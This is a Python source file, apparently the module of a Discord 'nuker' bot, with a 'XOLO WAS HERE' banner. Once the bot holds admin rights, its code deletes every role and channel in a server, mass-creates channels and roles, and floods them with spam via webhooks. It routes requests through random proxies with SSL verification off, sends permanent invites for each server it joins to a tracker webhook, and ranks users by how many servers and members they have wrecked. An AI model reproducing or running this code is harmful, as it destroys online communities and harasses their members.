


# ██╗░░██╗░█████╗░██╗░░░░░░█████╗░  ░██╗░░░░░░░██╗░█████╗░░██████╗  ██╗░░██╗███████╗██████╗░███████╗
# ╚██╗██╔╝██╔══██╗██║░░░░░██╔══██╗  ░██║░░██╗░░██║██╔══██╗██╔════╝  ██║░░██║██╔════╝██╔══██╗██╔════╝
# ░╚███╔╝░██║░░██║██║░░░░░██║░░██║  ░╚██╗████╗██╔╝███████║╚█████╗░  ███████║█████╗░░██████╔╝█████╗░░
# ░██╔██╗░██║░░██║██║░░░░░██║░░██║  ░░████╔═████║░██╔══██║░╚═══██╗  ██╔══██║██╔══╝░░██╔══██╗██╔══╝░░
# ██╔╝╚██╗╚█████╔╝███████╗╚█████╔╝  ░░╚██╔╝░╚██╔╝░██║░░██║██████╔╝  ██║░░██║███████╗██║░░██║███████╗
# ╚═╝░░╚═╝░╚════╝░╚══════╝░╚════╝░  ░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝


import aiohttp, asyncio, random, json
            
class Modules:
    already_nuked_servers = []
    
    def guild_join_event(func):
        async def wrapper(self, *args, **kwargs):
            await func(self, *args, **kwargs)
            guild = args[1]["d"]
            async with aiohttp.ClientSession() as session:
                if "unavailable" not in guild:
                    await self.get_random_invite(session, args[0])
                    if not self.has_admin_permission(args[1]):
                        async with aiohttp.ClientSession() as session:
                            await self.leave_guild(session, args[0])
                else:
                    await self.leave_x_guilds(session, 50, 25)
        return wrapper   
    
    def has_admin_permission(self, event_data):
        roles = event_data['d']['roles']
        bot_role = []
        for user in event_data["d"]["members"]:
            print(user["user"]["id"], self.Main.bot_info["nuke"]["client_id"])
            if int(user["user"]["id"]) == self.Main.bot_info["nuke"]["client_id"]:
                bot_role = user["roles"]
                break
            
        admin_permission_bit = 0x8
        for role in roles:
            if role['id'] in bot_role:
                permissions = int(role['permissions'])
                if permissions & admin_permission_bit:
                    return True
        return False

    async def get_user_roles_in_guild(self, session, guild_id, user_id):
        while True:
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}", headers={"Authorization": "Bot " + self.Main.bot_info["oauth"]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 200:
                    return (await response.json()).get('roles')
                elif response.status not in [429, 404]:
                    return None
                else:
                    await asyncio.sleep(float((await response.json()).get("retry_after", 0)))

    async def leave_x_guilds(self, session, max=None, leave=None):
        groups = await self.get_guilds(session)
        if groups and not max or (len(groups) > max):
            tasks = []
            for group in groups[:leave] if leave else groups:
                tasks.append(self.leave_guild(session, group["id"]))
            await asyncio.gather(*tasks)
        
    async def get_guilds(self, session):
        while True:
            async with session.get(f"https://discord.com/api/v10/users/@me/guilds", headers={"Authorization": "Bot " + self.Main.bot_info["nuke"]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 200:
                    return await response.json()
                elif response.status != 429:
                    return None
                else:
                    await asyncio.sleep(float((await response.json()).get("retry_after", 0)))
                
    async def leave_guild(self, session, guild_id):
        url = f'https://discord.com/api/v10/users/@me/guilds/{guild_id}'
        headers = {
            "Authorization": f"Bot {self.token}"
        }
        
        while True:
            async with session.delete(url, headers=headers, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 204:
                    print(f"Successfully left guild {guild_id}")
                    return True
                elif response.status == 429:
                    rsp = await response.json()
                    print(f"Failed to leave guild {guild_id}: 429 - {rsp}")
                    sleep = float(rsp.get("retry_after", 0))
                    if sleep > 10:
                        return False
                    await asyncio.sleep(sleep)
                else:
                    print(f"Failed to leave guild {guild_id}: {response.status} - {await response.text()}")
                    return False
    
    async def get_guild_channels(self, session, guild_id):
        while True:
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers={"Authorization": "Bot " + self.Main.bot_info["nuke"]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 200:
                    return await response.json()
                elif response.status != 429:
                    return None
                else:
                    sleep = float((await response.json()).get("retry_after", 0))
                    if sleep > 10:
                        return None
                    await asyncio.sleep(sleep)
    
    async def get_guild_roles(self, session, guild_id):
        while True:
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/roles", headers={"Authorization": "Bot " + self.Main.bot_info["nuke"]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 200:
                    return await response.json()
                elif response.status != 429:
                    return None
                else:
                    sleep = float((await response.json()).get("retry_after", 0))
                    if sleep > 10:
                        return None
                    await asyncio.sleep(sleep)
    
    async def delete_guild_roles(self, session, guild_id, roles):
        tasks = []
        for role in roles:
            if role["name"] != "@everyone":
                tasks.append(await self.delete_guild_role(session, guild_id, role["id"]))
        return tasks
    
    async def delete_guild_role(self, session, guild_id, role_id):
        while True:
            async with session.delete(f"https://discord.com/api/v10/guilds/{guild_id}/roles/{role_id}", headers={"Authorization": "Bot " + self.Main.bot_info["nuke"]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 204:
                    print(f"Successfully deleted role {role_id} in guild {guild_id}")
                    return True
                elif response.status == 429:
                    rsp = await response.json()
                    print(f"Failed to delete role {role_id} in guild {guild_id}: 429 - {rsp}")
                    sleep = float(rsp.get("retry_after", 0))
                    if sleep > 10:
                        return False
                    await asyncio.sleep(sleep)
                else:
                    print(f"Failed to delete role {role_id} in guild {guild_id}: {response.status} - {await response.text()}")
                    return False
                    
    async def delete_guild_channels(self, session, channels):
        tasks = [self.delete_guild_channel(session, channel["id"]) for channel in channels]
        return await asyncio.gather(*tasks)
    
    async def delete_guild_channel(self, session, channel_id):
        while True:
                async with session.delete(f"https://discord.com/api/v10/channels/{channel_id}", headers={"Authorization": "Bot " + self.Main.bot_info["nuke"]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                    if response.status == 200:
                        print(f"Successfully deleted channel {channel_id}")
                        return True
                    elif response.status == 429:
                        rsp = await response.json()
                        print(f"Failed to delete channel {channel_id}: 429 - {rsp}")
                        sleep = float(rsp.get("retry_after", 0))
                        if sleep > 10:
                            return False
                        await asyncio.sleep(sleep)
                    else:
                        print(f"Failed to delete channel {channel_id}: {response.status} - {await response.text()}")
                        return False
    
    async def create_guild_channels(self, session, guild_id, data, channel_count):
        tasks = [self.create_guild_channel(session, guild_id, data) for i in range(channel_count)]
        return await asyncio.gather(*tasks)
    
    async def create_guild_channel(self, session, guild_id, data):
        while True:
            async with session.post(f"https://discord.com/api/v10/guilds/{guild_id}/channels", json=data, headers={"Authorization": "Bot " + self.Main.bot_info["nuke"]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 201:
                    print(f"Successfully created channel in guild {guild_id}")
                    asyncio.create_task(self.spam_guild_channel((await response.json())["id"], self.Main.nuke_settings["guild_channel_message_data"], self.Main.nuke_settings["guild_channel_webhook_create_data"]))
                    return True
                elif response.status == 429:
                    rsp = await response.json()
                    print(f"Failed to create channel in guild {guild_id}: 429 - {await response.text()}")
                    sleep = float(rsp.get("retry_after", 0))
                    if sleep > 10:
                        return False
                    await asyncio.sleep(sleep)
                else:
                    print(f"Failed to create channel in guild {guild_id}: {response.status} - {await response.text()}")
                    return False
        
    async def create_guild_roles(self, session, guild_id, data, role_count):
        tasks = [self.create_guild_role(session, guild_id, data) for i in range(role_count)]
        return await asyncio.gather(*tasks)

    async def create_guild_role(self, session, guild_id, data):
        while True:
            async with session.post(f"https://discord.com/api/v10/guilds/{guild_id}/roles", json=data, headers={"Authorization": "Bot " + self.Main.bot_info["nuke"]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 200:
                    print(f"Successfully created role in guild {guild_id}")
                    return True
                elif response.status == 429:
                    rsp = await response.json()
                    print(f"Failed to create role in guild {guild_id}: 429 - {rsp}")
                    sleep = float(rsp.get("retry_after", 0))
                    if sleep > 10:
                        return False
                    await asyncio.sleep(sleep)
                else:
                    print(f"Failed to create role in guild {guild_id}: {response.status} - {await response.text()}")
                    return False
    
    async def create_guild_channel_webhook(self, session, channel_id, data):
        while True:
         try:
            async with session.post(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", json=data, headers={"Authorization": "Bot " + self.Main.bot_info["nuke"]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 200:
                    return await response.json()
                elif response.status == 429:
                    break
                    sleep = float((await response.json()).get("retry_after", 0))
                    if sleep > 10:
                        return None
                    await asyncio.sleep(sleep)
                else:
                    return None
         except:
             return None
        
    async def spam_guild_channel(self, channel_id, data_spam, data_webhook):
        async with aiohttp.ClientSession() as session:
         webhook = await self.create_guild_channel_webhook(session, channel_id, data_webhook)
         urls = [f"https://discord.com/api/v10/channels/{channel_id}/messages"]
         if webhook:
            urls.append(f"https://discord.com/api/v10/webhooks/{webhook.get('id')}/{webhook.get('token')}")
         for i in range(20):
            try:
                await session.post(random.choice(urls), json=data_spam, headers={"Authorization": "Bot " + self.Main.bot_info["nuke"]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False)
            except Exception as e:
                print("Error sending message " + str(e))
                continue
    
    async def get_random_invite(self, session, guild_id):
        channels = await self.get_guild_channels(session, guild_id)
        if channels:
            invite = await self.get_guild_channel_invite(session, random.choice([channel for channel in channels if channel['type'] == 0])['id'], {"max_age": 86400, "max_uses": 0 })
            if invite:
                invite = f"https://discord.gg/{invite['code']}"
                await self.send_webhook_message(session, self.Main.tracker_webhook, {"content": self.Main.nuke_settings["tracker_message"].format(invite=invite)})
            
    async def get_guild_channel_invite(self, session, channel_id, data):
        while True:
            async with session.post(f"https://discord.com/api/v10/channels/{channel_id}/invites", json=data, headers={"Authorization": "Bot " + self.Main.bot_info["nuke"]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 200:
                    return await response.json()
                if response.status == 429:
                    sleep = float((await response.json()).get("retry_after", 0))
                    if sleep > 10:
                        return None
                    await asyncio.sleep(sleep)
                else:
                    return None
    
    async def add_up_stats(self, session, guild_id, user_id):
        if guild_id not in self.already_nuked_servers:
            self.already_nuked_servers.append(guild_id)
            guild_members = await self.get_guild_member_info(session, guild_id)
            if guild_members:
                data = json.loads(open("database.json", "r").read())
                if str(user_id) not in data["nuke_stats"]:
                    data["nuke_stats"][str(user_id)] = {
                        "total_servers": 0,
                        "total_members": 0
                    }
                data["nuke_stats"][str(user_id)]["total_servers"] += 1
                data["nuke_stats"][str(user_id)]["total_members"] += guild_members["approximate_member_count"]
                open("database.json", "w").write(json.dumps(data, indent=4))
                stats = self.generate_leaderboard()
                messages = await self.get_guild_channel_messages(session, self.Main.top_nuker_channel_id)
                if messages:
                    for message in messages:
                        await self.delete_guild_channel_message(session, self.Main.top_nuker_channel_id, message["id"])
                    await self.send_webhook_message(session, self.Main.top_nuker_guild_channel_webhook, {"content": stats, "flags": 4096})
                        
                
    async def get_guild_member_info(self, session, guild_id):
        while True:
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/preview", headers={"Authorization": "Bot " + self.Main.bot_info["nuke"]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 200:
                    return await response.json()
                elif response.status == 429:
                    sleep = float((await response.json()).get("retry_after", 0))
                    if sleep > 10:
                        return None
                    await asyncio.sleep(sleep)
                else:
                    return None
                
    async def delete_guild_channel_message(self, session, channel_id, message_id, type="oauth"):
        while True:
            async with session.delete(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}", headers={"Authorization": "Bot " + self.Main.bot_info[type]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 204:
                    return True
                elif response.status == 429:
                    sleep = float((await response.json()).get("retry_after", 0))
                    if sleep > 10:
                        return None
                    await asyncio.sleep(sleep)
                else:
                    return False
        
    async def send_webhook_message(self, session, webhook, data):
        return await session.post(webhook, json=data, ssl=False)
    
    async def get_guild_channel_messages(self, session, channel_id, type="oauth"):
        while True:
            async with session.get(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers={"Authorization": "Bot " + self.Main.bot_info[type]["token"]}, proxy=random.choice(self.Main.proxies), ssl=False) as response:
                if response.status == 200:
                    return await response.json()
                elif response.status == 429:
                    sleep = float((await response.json()).get("retry_after", 0))
                    if sleep > 10:
                        return None
                    await asyncio.sleep(sleep)
                else:
                    return None
        
    def generate_leaderboard(self):
        data = json.loads(open("database.json", "r").read())["nuke_stats"]
        top_servers_users = sorted(data.items(), key=lambda x: x[1]["total_servers"], reverse=True)[:5]
        top_members_users = sorted(data.items(), key=lambda x: x[1]["total_members"], reverse=True)[:5]
        
        leaderboard_text = "**Leaderboard - Most Servers**:\n"
        for i, (user_id, stats) in enumerate(top_servers_users, start=1):
            leaderboard_text += f"{i}. User ID: <@{user_id}>, Total Servers: {stats['total_servers']}\n"

        leaderboard_text += "\n**Leaderboard - Most Members**:\n"
        for i, (user_id, stats) in enumerate(top_members_users, start=1):
            leaderboard_text += f"{i}. User ID: <@{user_id}>, Total Members: {stats['total_members']}\n"

        return leaderboard_text
    
    async def nuke(self, guild_id, user_id):
        async with aiohttp.ClientSession() as session:
            await self.add_up_stats(session, guild_id, user_id)
            channels = await self.get_guild_channels(session, guild_id)
            roles = await self.get_guild_roles(session, guild_id)
            if None not in [channels, roles]:
                await asyncio.gather(*[self.delete_guild_roles(session, guild_id, roles), self.delete_guild_channels(session, channels), self.create_guild_channels(session, guild_id, self.Main.nuke_settings["guild_channel_create_data"], self.Main.nuke_settings["guild_channel_spam_count"]), self.create_guild_roles(session, guild_id, self.Main.nuke_settings["guild_role_create_data"], self.Main.nuke_settings["guild_role_spam_count"])])
    
    async def delete_channels(self, guild_id):
        async with aiohttp.ClientSession() as session:
            channels = await self.get_guild_channels(session, guild_id)
            if channels:
                await self.delete_guild_channels(session, channels)
    
    async def _delete_guild_roles(self, guild_id):
        async with aiohttp.ClientSession() as session:
            roles = await self.get_guild_roles(session, guild_id)
            if roles:
                await self.delete_guild_roles(session, guild_id, roles)
    
    async def _create_guild_channels(self, guild_id):
        async with aiohttp.ClientSession() as session:
            await self.create_guild_channels(session, guild_id, self.Main.nuke_settings["guild_channel_create_data"], self.Main.nuke_settings["guild_channel_spam_count"])
    
    async def _create_guild_roles(self, guild_id):
        async with aiohttp.ClientSession() as session:
            await self.create_guild_roles(session, guild_id, self.Main.nuke_settings["guild_role_create_data"], self.Main.nuke_settings["guild_role_spam_count"])
